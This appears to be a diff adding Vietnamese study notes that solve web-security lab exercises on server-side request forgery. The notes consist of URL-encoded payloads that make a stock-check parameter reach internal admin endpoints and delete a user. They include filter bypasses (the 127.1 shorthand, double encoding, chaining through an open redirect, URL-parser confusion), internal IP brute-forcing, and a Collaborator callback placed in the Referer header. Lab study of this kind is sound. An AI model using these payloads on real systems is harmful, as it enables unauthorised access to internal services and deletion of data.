@@ -1,0 +1,15 @@
+1: Thêm vào phần stockAPI: http%3A%2F%2Flocalhost%2Fadmin%2Fdelete%3Fusername%3Dcarlos
+
+2: http%3A%2F%2F192.168.0.124%3A8080%2Fadmin%2Fdelete%3Fusername%3Dcarlos
+
+3: req GET vào intruder và để payload position vào octect cuối của địa chỉ ip BF từ 0 đến 255, ta sẽ thấy một req khác 1 có status khác 500, đó chính là ip address của admin, tiến hành gửi req xóa tài khoản carlos
+
+4: http%3A%2F%2F127.1%2F%2561dmin%2Fdelete%3Fusername%3Dcarlos
+
+5: %2Fproduct%2FnextProduct%3Fpath%3dhttp%3a%2F%2F192.168.0.12%3a8080%2Fadmin%2Fdelete%3fusername%3dcarlos
+
+6: ở referer header của req get /product?productId=x đổi địa chỉ thành địa chỉ của burpSuite collaborator và gửi (phải thêm https:// vì yêu cầu absolute url)
+
+7: (XEM SOLUTION) http%3A%2F%2Flocalhost:80%2523%40stock.weliketoshop.net%2fadmin%2fdelete%3fusername%3dcarlos
+
+8: 
